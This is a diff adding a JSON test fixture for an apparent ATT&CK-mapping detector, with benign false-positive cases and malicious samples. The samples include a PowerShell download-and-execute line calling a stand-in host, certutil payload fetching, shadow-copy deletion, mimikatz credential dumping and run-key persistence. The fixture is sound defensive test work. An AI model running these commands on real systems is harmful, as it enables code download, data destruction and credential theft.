@@ -1,0 +1,317 @@
+{
+  "schema_version": "1.0",
+  "cases": [
+    {
+      "id": "benign-empty",
+      "kind": "benign",
+      "description": "An empty report must remain clean.",
+      "report": {
+        "nodes": [],
+        "iocs": {}
+      },
+      "expected": {
+        "confidence": 0.0,
+        "technique_ids": [],
+        "tactics": [],
+        "lolbin_executables": [],
+        "malware_tags": []
+      }
+    },
+    {
+      "id": "benign-meeting-notes",
+      "kind": "benign",
+      "description": "Ordinary prose with a URL and the word 'cmd' must not produce techniques, LOLBins, or tags.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "Meeting notes: please look at the report at https://example.test/quarterly.pdf and reply by 10:30. The cmd from finance was to hold budget."
+          }
+        ],
+        "iocs": {
+          "urls": [
+            "https://example.test/quarterly.pdf"
+          ]
+        }
+      },
+      "expected": {
+        "confidence": 0.0,
+        "technique_ids": [],
+        "tactics": [],
+        "lolbin_executables": [],
+        "malware_tags": []
+      }
+    },
+    {
+      "id": "benign-everyday-words",
+      "kind": "benign",
+      "description": "Everyday words that overlap LOLBin names (at, hh:mm) must not fire.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "The sync runs at 09:00 (format hh:mm). Look at the schedule and let me know."
+          }
+        ],
+        "iocs": {}
+      },
+      "expected": {
+        "confidence": 0.0,
+        "technique_ids": [],
+        "tactics": [],
+        "lolbin_executables": [],
+        "malware_tags": []
+      }
+    },
+    {
+      "id": "benign-url-only",
+      "kind": "benign",
+      "description": "A bare URL with no retrieval behavior is an IOC, not a T1105 finding or a downloader tag.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "Documentation lives at https://docs.example.test/manual if you need a reference."
+          }
+        ],
+        "iocs": {
+          "urls": [
+            "https://docs.example.test/manual"
+          ]
+        }
+      },
+      "expected": {
+        "confidence": 0.0,
+        "technique_ids": [],
+        "tactics": [],
+        "lolbin_executables": [],
+        "malware_tags": []
+      }
+    },
+    {
+      "id": "powershell-encoded-downloader",
+      "kind": "malicious",
+      "description": "Encoded PowerShell downloader: execution, obfuscation, transfer, staging.",
+      "report": {
+        "nodes": [
+          {
+            "id": 3,
+            "content_preview": "powershell.exe -enc AAAA; IEX(New-Object Net.WebClient).DownloadString('https://example.test/a')"
+          }
+        ],
+        "iocs": {
+          "urls": [
+            "https://example.test/a"
+          ]
+        }
+      },
+      "expected": {
+        "confidence": 0.8,
+        "technique_ids": [
+          "T1027",
+          "T1059.001",
+          "T1105"
+        ],
+        "tactics": [
+          "command-and-control",
+          "defense-evasion",
+          "execution"
+        ],
+        "lolbin_executables": [
+          "powershell.exe"
+        ],
+        "malware_tags": [
+          "downloader-like",
+          "script-stager-like"
+        ]
+      }
+    },
+    {
+      "id": "certutil-fetch-and-decode",
+      "kind": "malicious",
+      "description": "certutil used to fetch and decode a payload.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "certutil -urlcache -f https://x.test/a a.txt && certutil -decode a.txt a.bin"
+          }
+        ],
+        "iocs": {
+          "urls": [
+            "https://x.test/a"
+          ]
+        }
+      },
+      "expected": {
+        "confidence": 0.76,
+        "technique_ids": [
+          "T1140",
+          "T1105"
+        ],
+        "tactics": [
+          "command-and-control",
+          "defense-evasion"
+        ],
+        "lolbin_executables": [
+          "certutil.exe"
+        ],
+        "malware_tags": [
+          "downloader-like"
+        ]
+      }
+    },
+    {
+      "id": "ransomware-recovery-inhibition",
+      "kind": "malicious",
+      "description": "Shadow-copy deletion and recovery inhibition.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled no"
+          }
+        ],
+        "iocs": {}
+      },
+      "expected": {
+        "confidence": 0.67,
+        "technique_ids": [
+          "T1490"
+        ],
+        "tactics": [
+          "impact"
+        ],
+        "lolbin_executables": [],
+        "malware_tags": [
+          "ransomware-impact-like"
+        ]
+      }
+    },
+    {
+      "id": "credential-theft-lsass",
+      "kind": "malicious",
+      "description": "Credential-access tooling terminology.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "mimikatz sekurlsa::logonpasswords; dump lsass memory"
+          }
+        ],
+        "iocs": {}
+      },
+      "expected": {
+        "confidence": 0.72,
+        "technique_ids": [
+          "T1003"
+        ],
+        "tactics": [
+          "credential-access"
+        ],
+        "lolbin_executables": [],
+        "malware_tags": [
+          "credential-theft-like"
+        ]
+      }
+    },
+    {
+      "id": "scheduled-task-persistence",
+      "kind": "malicious",
+      "description": "Scheduled-task creation plus run-key persistence.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "schtasks /create /sc onlogon /tn Updater /tr C:\\payload.exe"
+          },
+          {
+            "id": 2,
+            "content_preview": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\payload.exe"
+          }
+        ],
+        "iocs": {}
+      },
+      "expected": {
+        "confidence": 0.66,
+        "technique_ids": [
+          "T1053.005",
+          "T1112",
+          "T1547.001"
+        ],
+        "tactics": [
+          "defense-evasion",
+          "execution",
+          "persistence",
+          "privilege-escalation"
+        ],
+        "lolbin_executables": [
+          "schtasks.exe"
+        ],
+        "malware_tags": []
+      }
+    },
+    {
+      "id": "cmd-with-execution-context",
+      "kind": "malicious",
+      "description": "cmd with real invocation context still fires, with discovery commands.",
+      "report": {
+        "nodes": [
+          {
+            "id": 1,
+            "content_preview": "cmd.exe /c whoami & systeminfo & tasklist"
+          }
+        ],
+        "iocs": {}
+      },
+      "expected": {
+        "confidence": 0.69,
+        "technique_ids": [
+          "T1033",
+          "T1057",
+          "T1059.003",
+          "T1082"
+        ],
+        "tactics": [
+          "discovery",
+          "execution"
+        ],
+        "lolbin_executables": [
+          "cmd.exe"
+        ],
+        "malware_tags": [
+          "host-discovery-like"
+        ]
+      }
+    },
+    {
+      "id": "detection-metadata-attack-ids",
+      "kind": "malicious",
+      "description": "Detection attack_ids metadata alone yields a catalog-backed technique.",
+      "report": {
+        "nodes": [],
+        "iocs": {}
+      },
+      "detections": [
+        {
+          "id": "fixture-rule",
+          "name": "Fixture",
+          "attack_ids": [
+            "T1003"
+          ]
+        }
+      ],
+      "expected": {
+        "confidence": 0.47,
+        "technique_ids": [
+          "T1003"
+        ],
+        "tactics": [
+          "credential-access"
+        ],
+        "lolbin_executables": [],
+        "malware_tags": []
+      }
+    }
+  ]
+}
